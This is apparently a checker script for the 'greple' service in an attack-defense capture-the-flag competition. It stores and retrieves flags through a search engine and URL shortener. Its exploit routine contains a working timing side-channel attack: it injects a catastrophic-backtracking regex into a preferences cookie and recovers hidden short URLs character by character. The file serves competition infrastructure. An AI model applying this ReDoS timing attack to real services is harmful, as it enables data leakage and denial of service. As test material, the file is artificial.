"""Checker for greple service."""

import hashlib
import json
import math
import pathlib
import random
import re
import string
from collections.abc import Sequence
from html import escape
from urllib.parse import quote, unquote, urlencode

import fastapi
import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

_CHECKER = Enochecker("greple", 7777)

with (pathlib.Path.cwd() / "words.json").open() as f:
    _WORDS: list[str] = json.load(f)

_ENTROPY = 64

_FLAG_URL_PREFIX = "http://example.com/"

_REGEX_ESCAPE = {ord(c): rf"\{c}" for c in r"^$.*?+{|()\["}

# TODO: add url prefix
_SHORT_URL_PREFIX = ""
_SHORT_URL_ALPHABET = string.digits + string.ascii_lowercase[: 16 - len(string.digits)]
_SHORT_URL_LENGTH = 8
_SHORT_URL_REGEX = (
    r"\b"
    f"{_SHORT_URL_PREFIX.translate(_REGEX_ESCAPE)}"
    f"[{_SHORT_URL_ALPHABET.translate(_REGEX_ESCAPE)}]"
    f"{{{_SHORT_URL_LENGTH}}}"
    r"\b"
)


def _cookieencode(query: dict[str, str]) -> str:
    return urlencode(query, quote_via=quote)


def _noise(entropy: int, alphabet: Sequence[str], sep: str) -> str:
    n = math.ceil(entropy / math.log2(len(alphabet)))
    return sep.join(random.choice(alphabet) for _ in range(n))


def _alnum(entropy: int = _ENTROPY) -> str:
    return _noise(entropy, string.ascii_letters + string.digits, "")


def _words(entropy: int = _ENTROPY) -> str:
    return _noise(entropy, _WORDS, " ")


async def _register(client: httpx.AsyncClient, user: str) -> str:
    res = await client.get("/preferences")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/preferences",
        data={"user": user, "password": _alnum(), "safe_search_regex": "xxx"},
    )
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    if res.next_request is None:
        raise MumbleException("No redirect")

    assert_in("user", res.cookies, "No user cookie")
    assert_equals(quote(user), res.cookies["user"], "Unexpected user cookie value")

    assert_in("hmac", res.cookies, "No hmac cookie")
    hmac = res.cookies["hmac"]

    assert_in("preferences", res.cookies, "No preferences cookie")
    assert_equals(
        _cookieencode({"safe_search_regex": "xxx"}),
        res.cookies["preferences"],
        "Unexpected preferences cookie value",
    )

    res = await client.send(res.next_request)
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(user)}"', res.text, "Unexpected form value")

    return hmac


async def _submit_page(
    client: httpx.AsyncClient,
    url: str,
    title: str,
    text: str,
) -> None:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={"url": url, "title": title, "text": text, "form_submit": "Submit"},
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in("page has been submitted", res.text, "Unexpected form value")


async def _shorten_url(client: httpx.AsyncClient, url: str) -> str:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post("/console", data={"form_url": "Shorten", "url": url})
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    return short_url[0]


async def _search(client: httpx.AsyncClient, q: str) -> httpx.Response:
    res = await client.get("/")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    query = urlencode({"q": q, "btnG": "Greple Search"})
    res = await client.get(f"/search?{query}")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(q)}"', res.text, "Unexpected form value")
    # TODO: more checks
    # TODO: add checks for result number and timing output

    return res


async def _get_short_url(client: httpx.AsyncClient, short_url: str) -> str:
    # TODO: remove prefix infavor of having prefix in url
    res = await client.get(f"/u/{short_url}")
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    try:
        return res.headers["Location"]
    except KeyError as e:
        raise MumbleException("Failed to get Location header") from e


@_CHECKER.putflag(0)
async def _putflag(
    task: PutflagCheckerTaskMessage,
    client: httpx.AsyncClient,
    db: ChainDB,
) -> str:
    user = _alnum()
    hmac = await _register(client, user)

    url = await _shorten_url(client, f"{_FLAG_URL_PREFIX}{quote(task.flag)}")

    text = _words()
    await _submit_page(
        client,
        _FLAG_URL_PREFIX.removeprefix("http://"),
        _words(_ENTROPY // 2),
        text + " " + url,
    )

    await db.set("user", user)
    await db.set("hmac", hmac)
    await db.set("text", text)

    return text


@_CHECKER.getflag(0)
async def _getflag(
    task: GetflagCheckerTaskMessage,
    client: httpx.AsyncClient,
    db: ChainDB,
) -> None:
    try:
        user = await db.get("user")
        hmac = await db.get("hmac")
        text = await db.get("text")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user"] = user
    client.cookies["hmac"] = hmac
    client.cookies["preferences"] = _cookieencode({"safe_search_regex": "xxx"})

    res = await _search(client, text)
    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    url = await _get_short_url(client, short_url[0])
    assert_in(quote(task.flag), url, "Flag missing")


async def _test_for_regex_match(client: httpx.AsyncClient, q: str, regex: str) -> bool:
    n = 2**8
    redos = "(" * n + "." + ")*" * n

    res = await client.get(
        "/search?" + urlencode({"q": q}),
        cookies={
            "preferences": _cookieencode(
                {"safe_search_enabled": "on", "safe_search_regex": redos + regex},
            ),
        },
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    t = re.search(r"\b[0-9]\.[0-9]{2}\b", res.text)
    if not t:
        raise MumbleException("Failed to find timing output")
    return float(t[0]) < 0.1


async def _divide_and_conquer(
    client: httpx.AsyncClient,
    attack_info: str,
    prefix: str = _SHORT_URL_PREFIX,
    candidates: str = _SHORT_URL_ALPHABET,
    length: int = _SHORT_URL_LENGTH,
) -> list[str]:
    if not await _test_for_regex_match(
        client,
        attack_info,
        attack_info.translate(_REGEX_ESCAPE)
        + " "
        + prefix.translate(_REGEX_ESCAPE)
        + "["
        + candidates.translate(_REGEX_ESCAPE)
        + "]",
    ):
        return []

    if len(candidates) == 1:
        if length == 1:
            return [prefix + candidates]

        return await _divide_and_conquer(
            client,
            attack_info,
            prefix + candidates,
            _SHORT_URL_ALPHABET,
            length - 1,
        )

    mid = len(candidates) // 2
    return await _divide_and_conquer(
        client,
        attack_info,
        prefix,
        candidates[:mid],
        length,
    ) + await _divide_and_conquer(
        client,
        attack_info,
        prefix,
        candidates[mid:],
        length,
    )


@_CHECKER.exploit(0)
async def _exploit_sca(
    task: ExploitCheckerTaskMessage,
    client: httpx.AsyncClient,
) -> str | None:
    if task.attack_info is None:
        raise MumbleException("Missing attack info")

    short_urls = await _divide_and_conquer(client, task.attack_info)

    for short_url in short_urls:
        url = await _get_short_url(client, short_url)
        flag = unquote(url.removeprefix(_FLAG_URL_PREFIX))
        if hashlib.sha256(flag.encode()).hexdigest() == task.flag_hash:
            return flag

    return None


def app() -> fastapi.FastAPI:
    """Return app to gunicorn."""
    return _CHECKER.app
